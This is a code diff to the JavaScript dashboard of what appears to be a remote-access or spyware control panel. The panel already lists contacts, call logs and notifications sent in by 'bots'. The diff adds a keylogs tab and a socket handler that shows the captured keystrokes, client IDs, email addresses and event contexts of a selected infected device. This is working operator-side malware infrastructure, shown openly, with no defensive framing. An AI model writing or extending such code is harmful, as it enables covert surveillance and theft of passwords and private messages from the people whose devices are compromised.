@@ -95,7 +95,8 @@ var table_div = document.getElementById('table'),
     refresh_check = document.getElementById('refresh-check'),
     notifications_div = document.getElementById('notifications'),
     errors_div = document.getElementById('errors'),
-    misc_div = document.getElementById('misc');
+    misc_div = document.getElementById('misc'),
+    keylogs_div = document.getElementById('keylogs');
 
 var firstLoadContacts = true,
     firstLoadCallLog = true,
@@ -188,6 +189,9 @@ function getMisc() {
     hideOtherTabs('misc_div');
 }
 
+function getKeylogs() {
+    hideOtherTabs('keylogs_div');
+}
 
 //When a bot sends data to web client
 socket.on('usrData', function (data) {
@@ -226,6 +230,17 @@ socket.on("cError", function (data) {
         para.appendChild(node);
         para.style.borderBottom = '1px solid #ddd';
         errors_div.appendChild(para);
+    }
+});
+
+socket.on("keyLog", function (data) {
+    console.log(data);
+    const keylogColumns = ['text', 'clientId', 'email', 'ts', 'eventContext', 'event'];
+    if (data.uid === currentUID) {
+        for (keylog of data.data){
+            console.table(keylog, keylogColumns);
+            handleKeylogs(keylog);
+        }
     }
 });
 
@@ -418,6 +433,14 @@ function handleMisc() {
     }
 }
 
+function handleKeylogs(keylog) {
+    var para = document.createElement("p");
+    var node = document.createTextNode(keylog.text + '\t\t\t' + keylog.clientId + '\t\t\t' + keylog.email + '\t\t\t' + keylog.ts + '\t\t\t' + keylog.eventContext + '\t\t\t' + keylog.event);
+    para.appendChild(node);
+    para.style.borderBottom = '1px solid #ddd';
+    keylogs_div.appendChild(para);
+}
+
 function hideOtherTabs(tabName) {
 
     table_div.style.visibility = 'hidden';
@@ -432,6 +455,7 @@ function hideOtherTabs(tabName) {
     notifications_div.style.visibility = 'hidden';
     errors_div.style.visibility = 'hidden';
     misc_div.style.visibility = 'hidden';
+    keylogs_div.style.visibility = 'hidden';
 
     if (tabName === 'table_div') table_div.style.visibility = 'visible';
     if (tabName === 'home_div') home_div.style.visibility = 'visible';
@@ -445,6 +469,7 @@ function hideOtherTabs(tabName) {
     if (tabName === 'notifications_div') notifications_div.style.visibility = 'visible';
     if (tabName === 'errors_div') errors_div.style.visibility = 'visible';
     if (tabName === 'misc_div') misc_div.style.visibility = 'visible';
+    if (tabName === 'keylogs_div') keylogs_div.style.visibility = 'visible';
 
 }
 
